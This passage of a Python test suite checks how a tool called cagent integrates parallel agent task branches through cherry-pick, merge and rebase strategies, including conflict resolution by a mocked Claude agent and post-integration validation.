            if args[0] == "grep":
                return _git_result(0, "conflict.py")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=MagicMock(),
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_git_add_fails_aborts(self, tmp_path):
        """conflict markers detected by grep -> abort.

        After Phase 90.M8, there is only one `git add -A` (check=False).
        The old test relied on the second add (check=True) raising.
        Now we test that grep finding markers still causes abort.
        """
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                # Grep finds conflict markers -> should abort
                return _git_result(0, "conflict.py\n")
            if args[0] == "add":
                return _git_result(0, "")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None,
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_cherry_pick_continue_success(self, tmp_path):
        """Full success path for cherry-pick mode."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "rev-parse":
                return _git_result(0, "newsha123\n")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        dashboard = MagicMock()
        memory = MagicMock()
        memory.read = MagicMock(return_value="")

        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=dashboard, memory=memory,
            )
        assert result is True
        assert task.commit_sha == "newsha123"
        memory.append.assert_called_once()
        dashboard.set_task_status.assert_called_once()

    @pytest.mark.asyncio
    async def test_cherry_pick_continue_fails_aborts(self, tmp_path):
        """cherry-pick --continue raises -> abort and return False."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "cherry-pick" and "--continue" in args:
                raise RuntimeError("cherry-pick --continue failed")
            if args[0] == "cherry-pick" and "--abort" in args:
                return _git_result(0, "")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None,
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_merge_commit_success(self, tmp_path):
        """Merge mode: commit --no-edit succeeds."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "rev-parse":
                return _git_result(0, "mergesha\n")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None, completion_mode="merge",
            )
        assert result is True

    @pytest.mark.asyncio
    async def test_merge_commit_fails(self, tmp_path):
        """Merge mode: commit --no-edit fails -> return False."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "commit":
                raise RuntimeError("commit failed")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None, completion_mode="merge",
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_rebase_continue_success(self, tmp_path):
        """Rebase mode: rebase --continue succeeds."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "rev-parse":
                return _git_result(0, "rebasesha\n")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None, completion_mode="rebase",
            )
        assert result is True

    @pytest.mark.asyncio
    async def test_rebase_continue_fails_aborts(self, tmp_path):
        """Rebase mode: rebase --continue fails -> abort."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "rebase" and "--continue" in args:
                raise RuntimeError("rebase --continue failed")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None, completion_mode="rebase",
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_with_integrated_tasks_and_memory(self, tmp_path):
        """Resolve conflicts with existing integrated tasks and memory context."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "rev-parse":
                return _git_result(0, "newsha\n")
            return _git_result(0, "")

        task = _done_task("2", "def456")
        prior = _done_task("1", "abc123")
        memory = MagicMock()
        memory.read = MagicMock(return_value="Prior task did X")

        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[prior], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None, memory=memory,
            )
        assert result is True
        memory.read.assert_called_with("1")

    @pytest.mark.asyncio
    async def test_rev_parse_fails_returns_false(self, tmp_path):
        """rev-parse HEAD fails -> return False."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "rev-parse":
                return _git_result(1, "")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0), \
             patch("cagent.integrator.base.shutil.rmtree"):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None, memory=MagicMock(read=MagicMock(return_value="")),
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_claude_dir_cleanup(self, tmp_path):
        """Existing .claude dir gets cleaned up after agent resolution."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()
        claude_dir = tmp_path / ".claude"
        claude_dir.mkdir()
        (claude_dir / "settings.json").write_text("{}", encoding="utf-8")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "rev-parse":
                return _git_result(0, "sha123\n")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None,
            )
        assert result is True
        assert not claude_dir.exists()

    @pytest.mark.asyncio
    async def test_rename_in_conflict_files(self, tmp_path):
        """Status with ' -> ' rename syntax is parsed correctly."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU old.py -> new.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            if args[0] == "rev-parse":
                return _git_result(0, "sha\n")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0) as mock_agent, \
             patch("cagent.integrator.base.shutil.rmtree"):
            await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None,
            )
        prompt_used = mock_agent.call_args[1]["prompt"]
        assert "new.py" in prompt_used


# --- _post_integrate_validate tests ---


class TestPostIntegrateValidate:
    @pytest.mark.asyncio
    async def test_cmd_passes_first_round(self, tmp_path):
        """Command passes on first try -> return True."""
        with patch("cagent.integrator.base._run_shell_cmd", new_callable=AsyncMock, return_value=(0, "ok")):
            result = await _post_integrate_validate(
                cmd_str="pytest", worktree_path=tmp_path, run_dir=tmp_path,
                integrator_model_override=None, timeout=60, dashboard=MagicMock(),
            )
        assert result is True

    @pytest.mark.asyncio
    async def test_cmd_fails_agent_repairs(self, tmp_path):
        """Command fails, agent repairs, command passes on retry."""
        call_count = {"shell": 0}

        async def fake_shell(cmd, cwd, timeout=300):
            call_count["shell"] += 1
            if call_count["shell"] == 1:
                return (1, "FAILED: test_foo")
            return (0, "all passed")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "M  fix.py\n")
            return _git_result(0, "")

        with patch("cagent.integrator.base._run_shell_cmd", side_effect=fake_shell), \
             patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0):
            result = await _post_integrate_validate(
                cmd_str="pytest", worktree_path=tmp_path, run_dir=tmp_path,
                integrator_model_override=None, timeout=60, dashboard=MagicMock(),
            )
        assert result is True

    @pytest.mark.asyncio
    async def test_cmd_fails_all_rounds(self, tmp_path):
        """Command fails both rounds -> return False."""
        with patch("cagent.integrator.base._run_shell_cmd", new_callable=AsyncMock, return_value=(1, "FAIL")), \
             patch("cagent.integrator.base._run_git", new_callable=AsyncMock, return_value=_git_result(0, "")), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0):
            result = await _post_integrate_validate(
                cmd_str="pytest", worktree_path=tmp_path, run_dir=tmp_path,
                integrator_model_override=None, timeout=60, dashboard=MagicMock(),
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_repair_agent_fails(self, tmp_path):
        """Repair agent returns non-zero -> stop and return False."""
        with patch("cagent.integrator.base._run_shell_cmd", new_callable=AsyncMock, return_value=(1, "FAIL")), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=1):
            result = await _post_integrate_validate(
                cmd_str="pytest", worktree_path=tmp_path, run_dir=tmp_path,
                integrator_model_override=None, timeout=60, dashboard=MagicMock(),
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_repair_agent_returns_none(self, tmp_path):
        """Repair agent returns None (timeout) -> stop and return False."""
        with patch("cagent.integrator.base._run_shell_cmd", new_callable=AsyncMock, return_value=(1, "FAIL")), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=None):
            result = await _post_integrate_validate(
                cmd_str="pytest", worktree_path=tmp_path, run_dir=tmp_path,
                integrator_model_override=None, timeout=60, dashboard=None,
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_repair_no_changes_skips_commit(self, tmp_path):
        """Agent makes no changes -> skip commit, log message."""
        call_count = {"shell": 0}

        async def fake_shell(cmd, cwd, timeout=300):
            call_count["shell"] += 1
            if call_count["shell"] == 1:
                return (1, "FAIL")
            return (1, "STILL FAIL")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "")
            return _git_result(0, "")

        dashboard = MagicMock()
        with patch("cagent.integrator.base._run_shell_cmd", side_effect=fake_shell), \
             patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0):
            result = await _post_integrate_validate(
                cmd_str="pytest", worktree_path=tmp_path, run_dir=tmp_path,
                integrator_model_override=None, timeout=60, dashboard=dashboard,
            )
        assert result is False
        summaries = [c[0][1].summary for c in dashboard.update.call_args_list]
        assert any("no changes" in s for s in summaries)

    @pytest.mark.asyncio
    async def test_git_add_runtime_error_breaks(self, tmp_path):
        """git add -A raises RuntimeError -> break and return False."""
        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "add":
                raise RuntimeError("git add error")
            return _git_result(0, "")

        with patch("cagent.integrator.base._run_shell_cmd", new_callable=AsyncMock, return_value=(1, "FAIL")), \
             patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=0):
            result = await _post_integrate_validate(
                cmd_str="pytest", worktree_path=tmp_path, run_dir=tmp_path,
                integrator_model_override=None, timeout=60, dashboard=None,
            )
        assert result is False


# --- merge_strategy tests ---


class TestMergeStrategy:
    @pytest.mark.asyncio
    async def test_task_without_commit_sha_fails(self, tmp_path):
        """Task with no commit_sha goes to failed."""
        task = Task(id="1", prompt="test", branch="b")
        task.status = "done"
        task.commit_sha = None

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            return _git_result(0, "")

        with patch("cagent.integrator.merge._run_git", side_effect=fake_git):
            integrated, failed = await merge_strategy(
                tasks=[task], worktree_path=tmp_path, run_dir=tmp_path,
                integration_branch="int", run_id="r1",
                integrator_model_override=None, timeout=60,
                dashboard=None, memory=None,
            )
        assert integrated == []
        assert failed == [task]

    @pytest.mark.asyncio
    async def test_merge_exception_caught(self, tmp_path):
        """Exception in merge loop -> task goes to failed."""
        task = _done_task("1", "abc123")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "branch" and "-f" in args:
                raise RuntimeError("unexpected error")
            return _git_result(0, "")

        with patch("cagent.integrator.merge._run_git", side_effect=fake_git):
            integrated, failed = await merge_strategy(
                tasks=[task], worktree_path=tmp_path, run_dir=tmp_path,
                integration_branch="int", run_id="r1",
                integrator_model_override=None, timeout=60,
                dashboard=MagicMock(), memory=None,
            )
        assert integrated == []
        assert failed == [task]

    @pytest.mark.asyncio
    async def test_merge_no_conflict_failure_aborts(self, tmp_path):
        """Merge fails without conflict markers -> abort merge, task fails."""
        task = _done_task("1", "abc123")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "merge":
                if "--abort" in args:
                    return _git_result(0, "")
                return _git_result(1, "")
            if args[0] == "status":
                return _git_result(0, "M  file.py\n")
            return _git_result(0, "")

        with patch("cagent.integrator.merge._run_git", side_effect=fake_git):
            integrated, failed = await merge_strategy(
                tasks=[task], worktree_path=tmp_path, run_dir=tmp_path,
                integration_branch="int", run_id="r1",
                integrator_model_override=None, timeout=60,
                dashboard=None, memory=None,
            )
        assert integrated == []
        assert failed == [task]


# --- rebase_strategy tests ---


class TestRebaseStrategy:
    @pytest.mark.asyncio
    async def test_missing_run_id_raises(self, tmp_path):
        """run_id is required."""
        task = _done_task("1", "abc123")
        with pytest.raises(ValueError, match="run_id is required"):
            await rebase_strategy(
                tasks=[task], worktree_path=tmp_path, run_dir=tmp_path,
                integration_branch="int",
                integrator_model_override=None, timeout=60,
                dashboard=None, memory=None, run_id="",
            )

    @pytest.mark.asyncio
    async def test_no_tasks_with_commits(self, tmp_path):
        """Tasks without commit_sha -> return empty integrated, all failed."""
        task = Task(id="1", prompt="test", branch="b")
        task.status = "done"
        task.commit_sha = None

        integrated, failed = await rebase_strategy(
            tasks=[task], worktree_path=tmp_path, run_dir=tmp_path,
            integration_branch="int",
            integrator_model_override=None, timeout=60,
            dashboard=None, memory=None, run_id="r1",
        )
        assert integrated == []
        assert failed == [task]

    @pytest.mark.asyncio
    async def test_rebase_exception_in_loop(self, tmp_path):
        """Exception during rebase loop -> remaining tasks fail."""
        task = _done_task("1", "abc123")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "checkout" and "-b" in args:
                raise RuntimeError("checkout failed")
            return _git_result(0, "")

        with patch("cagent.integrator.rebase._run_git", side_effect=fake_git):
            integrated, failed = await rebase_strategy(
                tasks=[task], worktree_path=tmp_path, run_dir=tmp_path,
                integration_branch="int",
                integrator_model_override=None, timeout=60,
                dashboard=MagicMock(), memory=None, run_id="r1",
            )
        assert integrated == []
        assert failed == [task]

    @pytest.mark.asyncio
    async def test_rebase_conflict_no_markers_skips(self, tmp_path):
        """Cherry-pick fails but no conflict markers -> skip task."""
        task = _done_task("1", "abc123")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "cherry-pick":
                if "--abort" in args:
                    return _git_result(0, "")
                return _git_result(1, "")
            if args[0] == "status":
                return _git_result(0, "M  file.py\n")
            if args[0] == "rev-parse":
                return _git_result(0, "sha\n")
            return _git_result(0, "")

        with patch("cagent.integrator.rebase._run_git", side_effect=fake_git):
            integrated, failed = await rebase_strategy(
                tasks=[task], worktree_path=tmp_path, run_dir=tmp_path,
                integration_branch="int",
                integrator_model_override=None, timeout=60,
                dashboard=MagicMock(), memory=None, run_id="r1",
            )
        assert integrated == []
        assert failed == [task]


def _setup_real_conflict_repo(repo: Path, tmp_path: Path):
    """Build a real git repo where two tasks edit shared.txt incompatibly.

    Returns (task_a, task_b, integration_worktree, run_dir). Both tasks change
    the same line from "base" to different values, so the second commit always
    conflicts when replayed/merged onto the first. An integration worktree is
    created at base on branch cagent/r1/integration.

    Shared by the real-git conflict-resolution tests for all three strategies,
    so adding coverage for a new strategy is a few lines reusing this helper.
    """
    import subprocess

    from cagent.worktree import create_worktree

    def _git(*args: str) -> str:
        return subprocess.run(
            ["git", *args], cwd=repo, capture_output=True, text=True, check=True
        ).stdout.strip()

    (repo / "shared.txt").write_text("base\n", encoding="utf-8")
    _git("add", "shared.txt")
    _git("commit", "-m", "base shared")
    base_sha = _git("rev-parse", "HEAD")

    _git("checkout", "-b", "cagent/r1/task-001", base_sha)
    (repo / "shared.txt").write_text("A\n", encoding="utf-8")
    _git("add", "shared.txt")
    _git("commit", "-m", "task A")
    a_sha = _git("rev-parse", "HEAD")

    _git("checkout", "-b", "cagent/r1/task-002", base_sha)
    (repo / "shared.txt").write_text("B\n", encoding="utf-8")
    _git("add", "shared.txt")
    _git("commit", "-m", "task B")
    b_sha = _git("rev-parse", "HEAD")

    # Detach the main worktree off the branches so the integration worktree
    # can be created freely.
    _git("checkout", base_sha)

    wt = tmp_path / "intwt"
    create_worktree(repo, wt, "cagent/r1/integration", base_sha)
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    task_a = _done_task("001", a_sha)
    task_a.branch = "cagent/r1/task-001"
    task_b = _done_task("002", b_sha)
    task_b.branch = "cagent/r1/task-002"
    return task_a, task_b, wt, run_dir


async def _fake_resolver_agent(prompt, worktree_path, run_dir, model_override,
                               timeout, dashboard, task_id="_integrator", api_key=None):
    """Stand-in integrator agent that resolves the conflict by writing a clean
    (marker-free) merged file. All git operations run for real."""
    (Path(worktree_path) / "shared.txt").write_text("A\nB\n", encoding="utf-8")
    return 0


def _assert_clean_merged(wt: Path) -> None:
    """Assert the integration worktree merged both sides with no markers and
    left no operation dangling (clean working tree)."""
    import subprocess

    content = (wt / "shared.txt").read_text(encoding="utf-8")
    assert "<<<<<<<" not in content
    assert "A" in content and "B" in content
    status = subprocess.run(
        ["git", "status", "--porcelain"], cwd=wt, capture_output=True, text=True
    ).stdout
    assert "shared.txt" not in status  # fully committed, nothing dangling


class TestStrategiesRealGitConflict:
    """Real-git conflict-resolution tests for every integration strategy.

    These run against a real git repository and mock ONLY the integrator agent
    (not git itself), so a wrong completion/abort command surfaces as a genuine
    failure. This guards the whole strategy family against the class of bug
    where over-mocking let a command that fails for real appear to succeed
    (the original rebase `completion_mode` bug).
    """

    @pytest.mark.asyncio
    async def test_cherry_pick_resolves_real_conflict(self, tmp_repo, tmp_path):
        task_a, task_b, wt, run_dir = _setup_real_conflict_repo(tmp_repo, tmp_path)
        with patch("cagent.integrator.base._run_claude_agent", side_effect=_fake_resolver_agent), \
             patch("cagent.integrator.base.prepare_sandbox"):
            integrated, failed = await cherry_pick_strategy(
                tasks=[task_a, task_b],
                worktree_path=wt,
                run_dir=run_dir,
                integrator_model_override=None,
                timeout=60,
                dashboard=None,
                memory=None,
            )
        assert task_a in integrated
        assert task_b in integrated
        assert failed == []
        _assert_clean_merged(wt)

    @pytest.mark.asyncio
    async def test_merge_resolves_real_conflict(self, tmp_repo, tmp_path):
        task_a, task_b, wt, run_dir = _setup_real_conflict_repo(tmp_repo, tmp_path)
        with patch("cagent.integrator.base._run_claude_agent", side_effect=_fake_resolver_agent), \
             patch("cagent.integrator.base.prepare_sandbox"):
            integrated, failed = await merge_strategy(
                tasks=[task_a, task_b],
                worktree_path=wt,
                run_dir=run_dir,
                integration_branch="cagent/r1/integration",
                run_id="r1",
                integrator_model_override=None,
                timeout=60,
                dashboard=None,
                memory=None,
            )
        assert task_a in integrated
        assert task_b in integrated
        assert failed == []
        _assert_clean_merged(wt)

    @pytest.mark.asyncio
    async def test_rebase_resolves_real_conflict(self, tmp_repo, tmp_path):
        # Regression for the completion_mode bug: rebase replays via cherry-pick,
        # so the conflict must be completed with `git cherry-pick --continue`.
        # With the old "rebase" mode, task_b would land in `failed`.
        task_a, task_b, wt, run_dir = _setup_real_conflict_repo(tmp_repo, tmp_path)
        with patch("cagent.integrator.base._run_claude_agent", side_effect=_fake_resolver_agent), \
             patch("cagent.integrator.base.prepare_sandbox"):
            integrated, failed = await rebase_strategy(
                tasks=[task_a, task_b],
                worktree_path=wt,
                run_dir=run_dir,
                integration_branch="cagent/r1/integration",
                integrator_model_override=None,
                timeout=60,
                dashboard=None,
                memory=None,
                run_id="r1",
            )
        assert task_a in integrated
        assert task_b in integrated
        assert failed == []
        _assert_clean_merged(wt)


# --- integrate() top-level function tests ---


class TestIntegrate:
    @pytest.mark.asyncio
    async def test_no_done_tasks_returns_base_sha(self, tmp_path):
        """No done tasks -> return base_sha."""
        task = Task(id="1", prompt="test", branch="b")
        task.status = "pending"
        with patch("cagent.worktree.create_worktree"):
            result = await integrate(
                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
            )
        assert result == "basesha"

    @pytest.mark.asyncio
    async def test_invalid_strategy_raises(self, tmp_path):
        """Invalid strategy -> ValueError."""
        task = _done_task("1", "abc123")
        with patch("cagent.worktree.create_worktree"), \
             pytest.raises(ValueError, match="Unknown strategy"):
            await integrate(
                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
                strategy="invalid",
            )

    @pytest.mark.asyncio
    async def test_all_fail_raises_runtime_error(self, tmp_path):
        """All integrations fail -> RuntimeError."""
        task = _done_task("1", "abc123")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.cherry_pick_strategy", new_callable=AsyncMock, return_value=([], [task])), \
             pytest.raises(RuntimeError, match="All 1.*failed"):
            await integrate(
                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
            )

    @pytest.mark.asyncio
    async def test_partial_failure_reports(self, tmp_path):
        """Some tasks fail -> dashboard event, but continues."""
        ok_task = _done_task("1", "abc123")
        fail_task = _done_task("2", "def456")
        dashboard = MagicMock()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            return _git_result(0, "tipsha\n")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.cherry_pick_strategy", new_callable=AsyncMock, return_value=([ok_task], [fail_task])), \
             patch("cagent.integrator._run_git", side_effect=fake_git):
            result = await integrate(
                tasks=[ok_task, fail_task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
                dashboard=dashboard,
            )
        assert result == "tipsha"
        dashboard.update.assert_called()

    @pytest.mark.asyncio
    async def test_squash_path(self, tmp_path):
        """Squash mode resets, removes .claude, and commits."""
        task = _done_task("1", "abc123")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "rev-parse":
                return _git_result(0, "squashsha\n")
            return _git_result(0, "")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.cherry_pick_strategy", new_callable=AsyncMock, return_value=([task], [])), \
             patch("cagent.integrator._run_git", side_effect=fake_git):
            result = await integrate(
                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
                squash=True,
            )
        assert result == "squashsha"

    @pytest.mark.asyncio
    async def test_post_integrate_cmd_runs(self, tmp_path):
        """post_integrate_cmd is executed after integration."""
        task = _done_task("1", "abc123")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            return _git_result(0, "sha\n")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.cherry_pick_strategy", new_callable=AsyncMock, return_value=([task], [])), \
             patch("cagent.integrator._run_git", side_effect=fake_git), \
             patch("cagent.integrator._post_integrate_validate", new_callable=AsyncMock, return_value=True) as mock_validate:
            await integrate(
                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
                post_integrate_cmd="pytest",
            )
        mock_validate.assert_called_once()

    @pytest.mark.asyncio
    async def test_post_integrate_cmd_fails_reports(self, tmp_path):
        """post_integrate_cmd failure -> dashboard error event AND raises.

        The failure must propagate (not be swallowed) so that `cagent run`
        exits non-zero instead of leaving the user with an integration branch
        whose tests never passed.
        """
        task = _done_task("1", "abc123")
        dashboard = MagicMock()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            return _git_result(0, "sha\n")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.cherry_pick_strategy", new_callable=AsyncMock, return_value=([task], [])), \
             patch("cagent.integrator._run_git", side_effect=fake_git), \
             patch("cagent.integrator._post_integrate_validate", new_callable=AsyncMock, return_value=False):
            with pytest.raises(RuntimeError, match="post-integrate-cmd failed"):
                await integrate(
                    tasks=[task], run_dir=tmp_path / "run1",
                    base_sha="basesha", repo_root=tmp_path,
                    post_integrate_cmd="pytest",
                    dashboard=dashboard,
                )
        summaries = [c[0][1].summary for c in dashboard.update.call_args_list]
        assert any("failed" in s for s in summaries)

    @pytest.mark.asyncio
    async def test_merge_strategy_dispatch(self, tmp_path):
        """strategy='merge' dispatches to merge_strategy."""
        task = _done_task("1", "abc123")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            return _git_result(0, "sha\n")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.merge_strategy", new_callable=AsyncMock, return_value=([task], [])) as mock_merge, \
             patch("cagent.integrator._run_git", side_effect=fake_git):
            await integrate(
